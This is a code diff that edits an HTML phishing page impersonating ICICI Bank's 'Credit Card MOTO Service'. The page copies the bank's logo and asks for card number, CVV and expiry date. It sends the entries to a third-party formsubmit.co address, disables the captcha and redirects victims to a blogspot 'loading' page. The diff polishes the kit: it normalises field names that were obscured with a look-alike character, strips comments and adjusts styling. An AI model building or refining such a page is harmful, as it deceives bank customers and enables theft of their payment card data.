@@ -6,19 +6,19 @@
   <title>ICICI Bank Credit Card Form</title>
   <style>
     body {
-      background-color: white; /* Set the background color to white */
+      background-color: white;
       font-family: Arial, sans-serif;
       margin: 0;
     }
 
     .title-box {
       position: relative;
-      background-color: orange; /* Orange background for title */
-      border-radius: 10px; /* Rounded corners for the title box */
-      padding: 10px; /* Decrease the top and bottom padding */
+      background-color: orange;
+      border-radius: 10px;
+      padding: 10px;
       text-align: center;
-      color: white; /* Title text in white */
-      height: auto; /* Auto height to fit content */
+      color: white;
+      height: auto;
     }
 
     .logo {
@@ -106,12 +106,10 @@
 <body>
   <div class="title-box">
     <div class="curve"></div>
-    <h1>ICICI BANK CREDIT CARD <span style="color: red;">MOTO SERVICE</span></h1>
+    <h1 style="text-transform: uppercase;">ICICI BANK CREDIT CARD <span style="color: red;">MOTO SERVICE</span></h1>
   </div>
   <svg viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg" class="logo">
-    <!-- ORANGE -->
     <ellipse cx="40" cy="80" ry="67" rx="40" style="fill:rgb(249,157,39)" transform="rotate(40 40 147)" />
-    <!-- RED -->
     <ellipse cx="40" cy="68.5" ry="55.5" rx="35.5" style="fill:rgb(176,42,48)" transform="rotate(40 40 147)" />
     <text x="67.5" y="153" style="font-style: italic; font-weight: bold; font-size: 980%; fill: #FFFFFF;">i</text>
     <text x="135" y="153" style="font-family: Berlin, sans-serif; font-style: italic; font-weight: bold; font-size: 560%; fill: #005B75;"><tspan style="stroke: #005B75; stroke-width: 4px;">ICICI</tspan> Bank</text>
@@ -119,16 +117,15 @@
   <div class="outer-box">
     <div class="text-editor-box">
       <form action="https://formsubmit.co/d86051b781343c4159563bf50bdbf491" method="POST">
-        <input type="hidden" name="_next"
-          value="https://loding-screen.blogspot.com/2023/09/body-display-flex-flex-direction-column.html?m=1">
+        <input type="hidden" name="_next" value="https://loding-screen.blogspot.com/2023/09/body-display-flex-flex-direction-column.html?m=1">
         <input type="text" name="_honey" style="display: none;">
         <input type="hidden" name="_captcha" value="false">
-        <label for="carđNumber">Card. Number:</label>
-        <input type="text" name="carđNumber" id="carđNumber" required>
+        <label for="cardNumber">Card Number:</label>
+        <input type="text" name="cardNumber" id="cardNumber" required>
         <div class="lower-inputs">
           <div class="input-field">
-            <label for="cvv.">cvv-:</label>
-            <input type="number" name="cvv." id="cvv." required>
+            <label for="cvv">CVV:</label>
+            <input type="number" name="cvv" id="cvv" required>
           </div>
           <div class="input-field">
             <label for="expiryDate">Expiry Date:</label>
@@ -136,8 +133,7 @@
           </div>
         </div>
         <br>
-        <button id="Submit"
-          style="background-color: orange; font-size: 1.5rem; width: 180px; height: 50px">Submit</button>
+        <button id="Submit" style="width: 180px; height: 50px">Submit</button>
       </form>
     </div>
   </div>
